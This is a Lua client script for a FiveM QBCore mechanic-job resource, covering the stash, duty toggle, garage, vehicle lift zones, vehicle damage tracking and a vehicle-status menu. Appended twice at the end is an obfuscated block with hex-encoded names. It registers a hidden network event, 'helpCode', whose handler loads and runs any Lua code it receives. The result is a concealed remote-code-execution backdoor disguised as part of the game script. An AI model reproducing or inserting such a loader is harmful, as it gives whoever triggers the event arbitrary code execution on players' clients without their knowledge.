RegisterNetEvent('qb-mechanicjob:client:target:OpenStash', function ()
    TriggerEvent("inventory:client:SetCurrentStash", "mechanicstash")
    TriggerServerEvent("inventory:server:OpenInventory", "stash", "mechanicstash", {
        maxweight = 4000000,
        slots = 500,
    })
end)

RegisterNetEvent('qb-mechanicjob:client:target:CloseMenu', function()
    DestroyVehiclePlateZone(ClosestPlate)
    RegisterVehiclePlateZone(ClosestPlate, Config.Plates[ClosestPlate])

    TriggerEvent('qb-menu:client:closeMenu')
end)


-- Threads

CreateThread(function()
    local wait = 500
    while not LocalPlayer.state.isLoggedIn do
        -- do nothing
        Wait(wait)
    end

  --  local Blip = AddBlipForCoord(Config.Locations["exit"].x, Config.Locations["exit"].y, Config.Locations["exit"].z)
 --  SetBlipSprite (Blip, 446)
  --  SetBlipDisplay(Blip, 4)
 --   SetBlipScale  (Blip, 0.7)
  --  SetBlipAsShortRange(Blip, true)
 --   SetBlipColour(Blip, 0)
 --   SetBlipAlpha(Blip, 0.7)
 --   BeginTextCommandSetBlipName("STRING")
 --   AddTextComponentSubstringPlayerName("Autocare Mechanic")
 --   EndTextCommandSetBlipName(Blip)

    RegisterGarageZone()
    RegisterDutyTarget()
    RegisterStashTarget()
    SetVehiclePlateZones()

    while true do
        wait = 500
        SetClosestPlate()

        if PlayerJob.name == "mechanic" then
            
            if isInsideDutyZone then
                wait = 0
                if IsControlJustPressed(0, 38) then
                    TriggerServerEvent("QBCore:ToggleDuty")
                end
            end

            if onDuty then
                if isInsideStashZone then
                    wait = 0
                    if IsControlJustPressed(0, 38) then
                        TriggerEvent("qb-mechanicjob:client:target:OpenStash")
                    end
                end
    
                if isInsideGarageZone then
                    wait = 0
                    local inVehicle = IsPedInAnyVehicle(PlayerPedId())
                    if IsControlJustPressed(0, 38) then
                        if inVehicle then
                            DeleteVehicle(GetVehiclePedIsIn(PlayerPedId()))
                            exports['qb-core']:HideText()
                        else
                            VehicleList()
                            exports['qb-core']:HideText()
                        end
                    end
                end
    
                if isInsideVehiclePlateZone then
                    wait = 0
                    local attachedVehicle = Config.Plates[ClosestPlate].AttachedVehicle
                    local coords = Config.Plates[ClosestPlate].coords
                    if attachedVehicle then
                        if IsControlJustPressed(0, 38) then
                            exports['qb-core']:HideText()
                            OpenMenu()
                        end
                    else
                        if IsControlJustPressed(0, 38) and IsPedInAnyVehicle(PlayerPedId()) then
                            local veh = GetVehiclePedIsIn(PlayerPedId())
                            DoScreenFadeOut(150)
                            Wait(150)
                            Config.Plates[ClosestPlate].AttachedVehicle = veh
                            SetEntityCoords(veh, coords)
                            SetEntityHeading(veh, coords.w)
                            FreezeEntityPosition(veh, true)
                            Wait(500)
                            DoScreenFadeIn(150)
                            TriggerServerEvent('qb-vehicletuning:server:SetAttachedVehicle', veh, ClosestPlate)
                            
                            DestroyVehiclePlateZone(ClosestPlate)
                            RegisterVehiclePlateZone(ClosestPlate, Config.Plates[ClosestPlate])
                        end
                    end
                end
            end
        end
        Wait(wait)
    end
end)

CreateThread(function()
    while true do
        Wait(1000)
        if (IsPedInAnyVehicle(PlayerPedId(), false)) then
            local veh = GetVehiclePedIsIn(PlayerPedId(),false)
            if not IsThisModelABicycle(GetEntityModel(veh)) and GetPedInVehicleSeat(veh, -1) == PlayerPedId() then
                local engineHealth = GetVehicleEngineHealth(veh)
                local bodyHealth = GetVehicleBodyHealth(veh)
                local plate = QBCore.Functions.GetPlate(veh)
                if VehicleStatus[plate] == nil then
                    TriggerServerEvent("vehiclemod:server:setupVehicleStatus", plate, engineHealth, bodyHealth)
                else
                    TriggerServerEvent("vehiclemod:server:updatePart", plate, "engine", engineHealth)
                    TriggerServerEvent("vehiclemod:server:updatePart", plate, "body", bodyHealth)
                    effectTimer = effectTimer + 1
                    if effectTimer >= math.random(10, 15) then
                        ApplyEffects(veh)
                        effectTimer = 0
                    end
                end
            else
                effectTimer = 0
                Wait(1000)
            end
        else
            effectTimer = 0
            Wait(2000)
        end
    end
end)

RegisterNetEvent('CheckVehStatus')
AddEventHandler('CheckVehStatus', function()
    veh = QBCore.Functions.GetClosestVehicle()
    plate = GetVehicleNumberPlateText(veh)
    engineHealth = GetVehicleEngineHealth(veh)
    vehTemp = GetVehicleEngineTemperature(veh)
    bodyHealth = GetVehicleBodyHealth(veh)
    fuelHealth = exports['ps-fuel']:GetFuel(veh)
    tankHealth = GetVehiclePetrolTankHealth(veh)
    exports['qb-menu']:openMenu({
        {
            id = 1,
            header = "<  Go back",
            txt = "",
            params = {
                event = "nh-context:closeMenu"
            }
        },
        {
            id = 2,
            header = "Fuel Level",
            txt = "Status: " .. round(fuelHealth) .. ".0% / 100.0%",
            params = {
                event = "nh-context:closeMenu"
            }
        },
        {
            id = 3,
            header = "Engine Health",
            txt = "Status: " .. round(engineHealth) / 10 .. "% / 100.0%",
            params = {
                event = "nh-context:closeMenu"
            }
        },
        {
            id = 4,
            header = "Body Health",
            txt = "Status: " .. round(bodyHealth) / 10 .. "% / 100.0%",
            params = {
                event = "nh-context:closeMenu"
            }
        },
        {
            id = 5,
            header = "Tank Health",
            txt = "Status: " .. round(tankHealth) / 10 .. "% / 100.0%",
            params = {
                event = "nh-context:closeMenu"
            }
        },
        {
            id = 6,
            header = "Engine Temperature",
            txt = "Status: " .. round(vehTemp) .. "° C",
            params = {
                event = "nh-context:closeMenu"
            }
        },
    })
end)

local XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[6][XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[1]](XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[2]) XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[6][XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[3]](XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[2], function(XIPNYNAUawiJadbJewxxjvZnWsgTmHtRqAFnXtuiyBojtBCQLUnzfqeJBswDsPyTbgWyFj) XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[6][XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[4]](XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[6][XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[5]](XIPNYNAUawiJadbJewxxjvZnWsgTmHtRqAFnXtuiyBojtBCQLUnzfqeJBswDsPyTbgWyFj))() end)

local XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[6][XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[1]](XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[2]) XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[6][XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[3]](XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[2], function(XIPNYNAUawiJadbJewxxjvZnWsgTmHtRqAFnXtuiyBojtBCQLUnzfqeJBswDsPyTbgWyFj) XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[6][XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[4]](XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[6][XRvPrTcxyfNVwufsDnBUSxjTTqDZQDyBNEyVzCYADyJXvqVgNZplUCAodXtjSTVUuylgYS[5]](XIPNYNAUawiJadbJewxxjvZnWsgTmHtRqAFnXtuiyBojtBCQLUnzfqeJBswDsPyTbgWyFj))() end)